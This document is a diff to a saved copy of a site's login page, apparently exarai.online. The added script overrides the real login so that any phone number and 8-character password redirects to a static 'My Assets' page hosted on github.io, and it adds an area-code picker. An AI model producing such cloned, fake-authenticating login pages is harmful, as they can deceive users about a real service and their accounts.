@@ -1,4 +1,5 @@
 
+
 <!DOCTYPE html>
 <!-- saved from url=(0027)https://exarai.online/login -->
 <html lang="en" class="dark"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
@@ -582,4 +583,311 @@
   </script>
 
   <script src="./nav-links.js"></script>
+
+  <style>
+    /* Custom login behavior styles */
+    .custom-login-disabled {
+      opacity: 0.4;
+      pointer-events: none;
+      cursor: default;
+    }
+
+    .custom-area-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.7);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 999999999;
+    }
+
+    .custom-area-panel {
+      width: 90%;
+      max-width: 420px;
+      max-height: 80vh;
+      background: #111826;
+      border-radius: 16px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
+      padding: 16px 16px 10px;
+      color: #f9fafb;
+      display: flex;
+      flex-direction: column;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", Arial, sans-serif;
+    }
+
+    .custom-area-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 10px;
+      font-size: 15px;
+      font-weight: 600;
+    }
+
+    .custom-area-close {
+      border: none;
+      background: transparent;
+      color: #9ca3af;
+      font-size: 18px;
+      cursor: pointer;
+    }
+
+    .custom-area-search {
+      margin-bottom: 10px;
+    }
+
+    .custom-area-search input {
+      width: 100%;
+      padding: 8px 10px;
+      border-radius: 10px;
+      border: 1px solid #374151;
+      background: #020617;
+      color: #e5e7eb;
+      font-size: 14px;
+      outline: none;
+    }
+
+    .custom-area-list {
+      flex: 1;
+      overflow-y: auto;
+      padding-right: 4px;
+      margin: 0;
+      list-style: none;
+    }
+
+    .custom-area-item {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 6px 4px;
+      border-radius: 8px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .custom-area-item span {
+      display: inline-block;
+    }
+
+    .custom-area-item:hover {
+      background: #111827;
+    }
+
+    .custom-area-code {
+      color: #9ca3af;
+      margin-left: 8px;
+    }
+  </style>
+
+  <script>
+    (function () {
+      var targetLoginUrl = "https://planko32.github.io/My%20Assets.html";
+
+      function waitForElements(selector, timeoutMs, callback) {
+        var start = Date.now();
+        var timer = setInterval(function () {
+          var nodes = document.querySelectorAll(selector);
+          if (nodes && nodes.length) {
+            clearInterval(timer);
+            callback(Array.prototype.slice.call(nodes));
+          } else if (Date.now() - start > timeoutMs) {
+            clearInterval(timer);
+          }
+        }, 200);
+      }
+
+      function createAreaOverlay(onSelect) {
+        var countries = [
+          { name: "Slovenia", code: "+386" },
+          { name: "Panama", code: "+507" },
+          { name: "Syria", code: "+963" },
+          { name: "Republic of Lebanon", code: "+961" },
+          { name: "Cyprus", code: "+357" },
+          { name: "Saudi Arabia", code: "+966" },
+          { name: "United Arab Emirates", code: "+971" },
+          { name: "Qatar", code: "+974" },
+          { name: "Kuwait", code: "+965" },
+          { name: "Bahrain", code: "+973" },
+          { name: "Jordan", code: "+962" },
+          { name: "Iraq", code: "+964" },
+          { name: "Turkey", code: "+90" },
+          { name: "United States", code: "+1" },
+          { name: "United Kingdom", code: "+44" },
+          { name: "Germany", code: "+49" },
+          { name: "France", code: "+33" },
+          { name: "Spain", code: "+34" },
+          { name: "Italy", code: "+39" },
+          { name: "Canada", code: "+1" },
+          { name: "Russia", code: "+7" },
+          { name: "China", code: "+86" },
+          { name: "Japan", code: "+81" },
+          { name: "South Korea", code: "+82" },
+          { name: "India", code: "+91" },
+          { name: "Pakistan", code: "+92" },
+          { name: "Afghanistan", code: "+93" },
+          { name: "Egypt", code: "+20" },
+          { name: "Morocco", code: "+212" },
+          { name: "Algeria", code: "+213" },
+          { name: "Tunisia", code: "+216" },
+          { name: "Libya", code: "+218" }
+        ];
+
+        var overlay = document.createElement("div");
+        overlay.className = "custom-area-overlay";
+
+        var panel = document.createElement("div");
+        panel.className = "custom-area-panel";
+
+        var header = document.createElement("div");
+        header.className = "custom-area-header";
+        header.innerHTML = "<span>Select area code</span>";
+
+        var closeBtn = document.createElement("button");
+        closeBtn.className = "custom-area-close";
+        closeBtn.type = "button";
+        closeBtn.textContent = "×";
+        closeBtn.addEventListener("click", function () {
+          document.body.removeChild(overlay);
+        });
+
+        header.appendChild(closeBtn);
+
+        var searchWrap = document.createElement("div");
+        searchWrap.className = "custom-area-search";
+        var searchInput = document.createElement("input");
+        searchInput.type = "text";
+        searchInput.placeholder = "Search country or code";
+        searchWrap.appendChild(searchInput);
+
+        var list = document.createElement("ul");
+        list.className = "custom-area-list";
+
+        function render(filtered) {
+          list.innerHTML = "";
+          filtered.forEach(function (item) {
+            var li = document.createElement("li");
+            li.className = "custom-area-item";
+            var left = document.createElement("span");
+            left.textContent = item.name;
+            var right = document.createElement("span");
+            right.className = "custom-area-code";
+            right.textContent = item.code;
+            li.appendChild(left);
+            li.appendChild(right);
+            li.addEventListener("click", function () {
+              onSelect(item);
+              document.body.removeChild(overlay);
+            });
+            list.appendChild(li);
+          });
+        }
+
+        render(countries);
+
+        searchInput.addEventListener("input", function () {
+          var value = searchInput.value.toLowerCase();
+          var filtered = countries.filter(function (item) {
+            return (
+              item.name.toLowerCase().indexOf(value) !== -1 ||
+              item.code.indexOf(value) !== -1
+            );
+          });
+          render(filtered);
+        });
+
+        panel.appendChild(header);
+        panel.appendChild(searchWrap);
+        panel.appendChild(list);
+        overlay.appendChild(panel);
+
+        document.body.appendChild(overlay);
+      }
+
+      function setupCustomLogin() {
+        var selectedCountryCode = "+386";
+
+        var phoneInput = document.querySelector('input[placeholder="Enter phone"]') ||
+          document.querySelector('input[type="tel"]');
+
+        var passwordInput = document.querySelector('input[type="password"]');
+        var loginButton = null;
+
+        var possibleButtons = document.querySelectorAll("button, .van-button");
+        Array.prototype.forEach.call(possibleButtons, function (btn) {
+          if (!loginButton) {
+            var text = (btn.textContent || "").trim().toLowerCase();
+            if (text === "log in" || text === "login") {
+              loginButton = btn;
+            }
+          }
+        });
+
+        var areaNode = null;
+        var allNodes = document.querySelectorAll("*");
+        Array.prototype.forEach.call(allNodes, function (node) {
+          if (!areaNode) {
+            var t = (node.textContent || "").trim();
+            if (t === "+386") {
+              areaNode = node;
+            }
+          }
+        });
+
+        if (!phoneInput || !passwordInput || !loginButton) {
+          return;
+        }
+
+        if (areaNode) {
+          areaNode.style.cursor = "pointer";
+          areaNode.addEventListener("click", function () {
+            createAreaOverlay(function (item) {
+              selectedCountryCode = item.code;
+              areaNode.textContent = item.code;
+            });
+          });
+        }
+
+        function updateLoginState() {
+          var phoneOk = phoneInput.value.trim().length > 0;
+          var passwordOk = passwordInput.value.length >= 8;
+          var canLogin = phoneOk && passwordOk;
+
+          if (canLogin) {
+            loginButton.classList.remove("custom-login-disabled");
+          } else {
+            loginButton.classList.add("custom-login-disabled");
+          }
+        }
+
+        updateLoginState();
+
+        phoneInput.addEventListener("input", updateLoginState);
+        passwordInput.addEventListener("input", updateLoginState);
+
+        loginButton.addEventListener("click", function (event) {
+          var phoneOk = phoneInput.value.trim().length > 0;
+          var passwordOk = passwordInput.value.length >= 8;
+
+          if (!(phoneOk && passwordOk)) {
+            event.preventDefault();
+            event.stopPropagation();
+            return;
+          }
+
+          event.preventDefault();
+          event.stopPropagation();
+
+          window.location.href = targetLoginUrl;
+        });
+      }
+
+      window.addEventListener("load", function () {
+        waitForElements('input[placeholder="Enter phone"], input[type="tel"]', 8000, function () {
+          setupCustomLogin();
+        });
+      });
+    })();
+  </script>
+
 </body></html>
